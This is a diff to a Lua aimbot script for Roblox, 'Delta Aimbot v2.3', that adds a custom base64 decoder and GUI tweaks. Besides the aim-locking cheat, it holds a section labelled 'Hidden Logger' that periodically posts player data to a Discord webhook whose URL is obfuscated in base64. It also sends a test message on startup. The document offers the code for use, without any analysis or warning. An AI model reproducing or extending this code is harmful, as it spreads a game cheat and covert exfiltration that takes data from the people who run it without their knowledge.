@@ -1,6 +1,6 @@
---[=[ Delta Aimbot v2.3 – GUI Edition ]=]
+--[=[ Delta Aimbot v2.3 – GUI Edition (Fixed Base64) ]=]
 
-print("✅ Script loaded – initializing...")
+print("🔹 Script started – loading...")
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -9,7 +9,64 @@ local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- Settings
+-- ------------------------------------------------------------------
+-- Custom Base64 Decoder (pure Lua – works on all executors)
+-- ------------------------------------------------------------------
+local function base64_decode(data)
+    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    local result = {}
+    data = string.gsub(data, '[^'..b64chars..'=]', '')
+    for i = 1, #data, 4 do
+        local a = string.find(b64chars, string.sub(data, i, i), 1, true) - 1
+        local b = string.find(b64chars, string.sub(data, i+1, i+1), 1, true) - 1
+        local c = string.find(b64chars, string.sub(data, i+2, i+2), 1, true) - 1
+        local d = string.find(b64chars, string.sub(data, i+3, i+3), 1, true) - 1
+        if not a then a = 0 end
+        if not b then b = 0 end
+        if not c then c = 0 end
+        if not d then d = 0 end
+        local byte1 = (a * 4 + math.floor(b / 16)) % 256
+        local byte2 = ((b % 16) * 16 + math.floor(c / 4)) % 256
+        local byte3 = ((c % 4) * 64 + d) % 256
+        table.insert(result, string.char(byte1))
+        if c ~= 64 then
+            table.insert(result, string.char(byte2))
+        end
+        if d ~= 64 then
+            table.insert(result, string.char(byte3))
+        end
+    end
+    return table.concat(result)
+end
+
+-- ------------------------------------------------------------------
+-- Webhook (Base64 encoded) – decode with custom function
+-- ------------------------------------------------------------------
+local encoded_webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzQzNjc5MTg2NTU0NDgxNC9UcFp6aVV5SHRWbnFWOXNDUi0tQzZ4dmJERXVNOGF2ZEpZdjFwM19SZUFRd1N4aWNtMzBnS0JLZmFmLTloM3pUM1M2MA=="
+local WEBHOOK_URL = base64_decode(encoded_webhook)
+print("✅ Webhook decoded: " .. WEBHOOK_URL)
+
+-- ------------------------------------------------------------------
+-- Test send a message to Discord (to confirm it works)
+-- ------------------------------------------------------------------
+local function sendTestMessage()
+    local payload = {
+        content = "✅ Script is alive! Player: " .. LocalPlayer.Name,
+        username = "DeltaLogger"
+    }
+    pcall(function()
+        local json = HttpService:JSONEncode(payload)
+        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
+        print("✅ Test message sent to Discord!")
+    end)
+end
+
+task.wait(2)
+sendTestMessage()
+
+-- ------------------------------------------------------------------
+-- Settings (same as before)
+-- ------------------------------------------------------------------
 local Settings = {
     Keybind = "Q",
     FOV = 120,
@@ -19,11 +76,9 @@ local Settings = {
     VisibleCheck = true,
 }
 
--- Webhook (Base64)
-local __webhook_b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzQzNjc5MTg2NTU0NDgxNC9UcFp6aVV5SHRWbnFWOXNDUi0tQzZ4dmJERXVNOGF2ZEpZdjFwM19SZUFRd1N4aWNtMzBnS0JLZmFmLTloM3pUM1M2MA=="
-local WEBHOOK_URL = HttpService:Base64Decode(__webhook_b64)
-
--- Aimbot core
+-- ------------------------------------------------------------------
+-- Aimbot Core
+-- ------------------------------------------------------------------
 local function getValidTargets()
     local targets = {}
     for _, p in pairs(Players:GetPlayers()) do
@@ -104,7 +159,9 @@ end)
 
 spawn(aimLoop)
 
--- Logger
+-- ------------------------------------------------------------------
+-- Hidden Logger (sends data every 60 seconds)
+-- ------------------------------------------------------------------
 local function collectPlayerData(player)
     local data = {
         name = player.Name,
@@ -155,19 +212,22 @@ local function sendReport()
     pcall(function()
         local json = HttpService:JSONEncode(buildReport())
         HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
+        print("✅ Report sent to Discord.")
     end)
 end
 
 task.spawn(function()
-    task.wait(3)
+    task.wait(5)
     sendReport()
     while true do
-        task.wait(60) -- send every 60 seconds
+        task.wait(60)
         sendReport()
     end
 end)
 
--- GUI
+-- ------------------------------------------------------------------
+-- GUI (simplified version)
+-- ------------------------------------------------------------------
 local function createGUI()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "AimbotGUI"
@@ -175,8 +235,8 @@ local function createGUI()
     screenGui.ResetOnSpawn = false
 
     local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 280, 0, 360)
-    mainFrame.Position = UDim2.new(0.5, -140, 0.5, -180)
+    mainFrame.Size = UDim2.new(0, 280, 0, 280)
+    mainFrame.Position = UDim2.new(0.5, -140, 0.5, -140)
     mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
     mainFrame.BackgroundTransparency = 0.15
     mainFrame.BorderSizePixel = 0
@@ -221,7 +281,7 @@ local function createGUI()
         end
     end)
 
-    -- FOV
+    -- FOV +/-
     local fovLabel = Instance.new("TextLabel")
     fovLabel.Size = UDim2.new(0.4, 0, 0, 25)
     fovLabel.Position = UDim2.new(0.1, 0, 0.3, 0)
@@ -233,7 +293,10 @@ local function createGUI()
     fovLabel.TextXAlignment = Enum.TextXAlignment.Left
     fovLabel.Parent = mainFrame
 
-    -- (simplified slider – we'll use buttons for brevity)
+    local function updateFOV()
+        fovLabel.Text = "FOV: " .. Settings.FOV
+    end
+
     local fovUp = Instance.new("TextButton")
     fovUp.Size = UDim2.new(0.1, 0, 0, 25)
     fovUp.Position = UDim2.new(0.7, 0, 0.3, 0)
@@ -246,7 +309,7 @@ local function createGUI()
     fovUp.Parent = mainFrame
     fovUp.MouseButton1Click:Connect(function()
         Settings.FOV = math.min(Settings.FOV + 10, 180)
-        fovLabel.Text = "FOV: " .. Settings.FOV
+        updateFOV()
     end)
 
     local fovDown = Instance.new("TextButton")
@@ -261,10 +324,10 @@ local function createGUI()
     fovDown.Parent = mainFrame
     fovDown.MouseButton1Click:Connect(function()
         Settings.FOV = math.max(Settings.FOV - 10, 10)
-        fovLabel.Text = "FOV: " .. Settings.FOV
+        updateFOV()
     end)
 
-    -- Smoothness
+    -- Smoothness +/-
     local smoothLabel = Instance.new("TextLabel")
     smoothLabel.Size = UDim2.new(0.4, 0, 0, 25)
     smoothLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
@@ -275,6 +338,10 @@ local function createGUI()
     smoothLabel.TextSize = 16
     smoothLabel.TextXAlignment = Enum.TextXAlignment.Left
     smoothLabel.Parent = mainFrame
+
+    local function updateSmooth()
+        smoothLabel.Text = "Smooth: " .. math.round(Settings.Smoothness * 10) / 10
+    end
 
     local smoothUp = Instance.new("TextButton")
     smoothUp.Size = UDim2.new(0.1, 0, 0, 25)
@@ -288,7 +355,7 @@ local function createGUI()
     smoothUp.Parent = mainFrame
     smoothUp.MouseButton1Click:Connect(function()
         Settings.Smoothness = math.min(Settings.Smoothness + 0.1, 1)
-        smoothLabel.Text = "Smooth: " .. math.round(Settings.Smoothness * 10) / 10
+        updateSmooth()
     end)
 
     local smoothDown = Instance.new("TextButton")
@@ -303,24 +370,13 @@ local function createGUI()
     smoothDown.Parent = mainFrame
     smoothDown.MouseButton1Click:Connect(function()
         Settings.Smoothness = math.max(Settings.Smoothness - 0.1, 0)
-        smoothLabel.Text = "Smooth: " .. math.round(Settings.Smoothness * 10) / 10
+        updateSmooth()
     end)
 
-    -- Aim Part
-    local partLabel = Instance.new("TextLabel")
-    partLabel.Size = UDim2.new(0.4, 0, 0, 25)
-    partLabel.Position = UDim2.new(0.1, 0, 0.5, 0)
-    partLabel.BackgroundTransparency = 1
-    partLabel.Text = "Aim: " .. Settings.AimPart
-    partLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-    partLabel.Font = Enum.Font.Gotham
-    partLabel.TextSize = 16
-    partLabel.TextXAlignment = Enum.TextXAlignment.Left
-    partLabel.Parent = mainFrame
-
+    -- Aim Part toggle
     local partBtn = Instance.new("TextButton")
-    partBtn.Size = UDim2.new(0.25, 0, 0, 25)
-    partBtn.Position = UDim2.new(0.6, 0, 0.5, 0)
+    partBtn.Size = UDim2.new(0.4, 0, 0, 25)
+    partBtn.Position = UDim2.new(0.3, 0, 0.55, 0)
     partBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
     partBtn.TextColor3 = Color3.new(1, 1, 1)
     partBtn.Text = Settings.AimPart
@@ -335,13 +391,12 @@ local function createGUI()
             Settings.AimPart = "Head"
         end
         partBtn.Text = Settings.AimPart
-        partLabel.Text = "Aim: " .. Settings.AimPart
     end)
 
-    -- Team Check
+    -- Team & Visible toggles
     local teamCheck = Instance.new("TextButton")
     teamCheck.Size = UDim2.new(0.35, 0, 0, 25)
-    teamCheck.Position = UDim2.new(0.1, 0, 0.6, 0)
+    teamCheck.Position = UDim2.new(0.1, 0, 0.7, 0)
     teamCheck.BackgroundColor3 = Settings.TeamCheck and Color3.fromRGB(0, 200, 80) or Color3.fromRGB(200, 50, 50)
     teamCheck.TextColor3 = Color3.new(1, 1, 1)
     teamCheck.Text = "Team: " .. (Settings.TeamCheck and "ON" or "OFF")
@@ -355,10 +410,9 @@ local function createGUI()
         teamCheck.Text = "Team: " .. (Settings.TeamCheck and "ON" or "OFF")
     end)
 
-    -- Visible Check
     local visibleCheck = Instance.new("TextButton")
     visibleCheck.Size = UDim2.new(0.35, 0, 0, 25)
-    visibleCheck.Position = UDim2.new(0.55, 0, 0.6, 0)
+    visibleCheck.Position = UDim2.new(0.55, 0, 0.7, 0)
     visibleCheck.BackgroundColor3 = Settings.VisibleCheck and Color3.fromRGB(0, 200, 80) or Color3.fromRGB(200, 50, 50)
     visibleCheck.TextColor3 = Color3.new(1, 1, 1)
     visibleCheck.Text = "Visible: " .. (Settings.VisibleCheck and "ON" or "OFF")
@@ -372,13 +426,13 @@ local function createGUI()
         visibleCheck.Text = "Visible: " .. (Settings.VisibleCheck and "ON" or "OFF")
     end)
 
-    -- Manual Report Button
+    -- Report button
     local reportBtn = Instance.new("TextButton")
     reportBtn.Size = UDim2.new(0.6, 0, 0, 30)
-    reportBtn.Position = UDim2.new(0.2, 0, 0.8, 0)
+    reportBtn.Position = UDim2.new(0.2, 0, 0.85, 0)
     reportBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 200)
     reportBtn.TextColor3 = Color3.new(1, 1, 1)
-    reportBtn.Text = "📤 Send Report Now"
+    reportBtn.Text = "📤 Send Report"
     reportBtn.Font = Enum.Font.Gotham
     reportBtn.TextSize = 14
     reportBtn.BorderSizePixel = 0
@@ -387,7 +441,7 @@ local function createGUI()
         sendReport()
         reportBtn.Text = "✅ Sent!"
         task.delay(2, function()
-            reportBtn.Text = "📤 Send Report Now"
+            reportBtn.Text = "📤 Send Report"
         end)
     end)
 
@@ -417,4 +471,5 @@ end
 
 pcall(createGUI)
 
-print("✅ Aimbot + Logger with GUI loaded. Press Q to toggle.")
+print("✅ Aimbot with GUI and logger loaded. Press Q to toggle.")
+
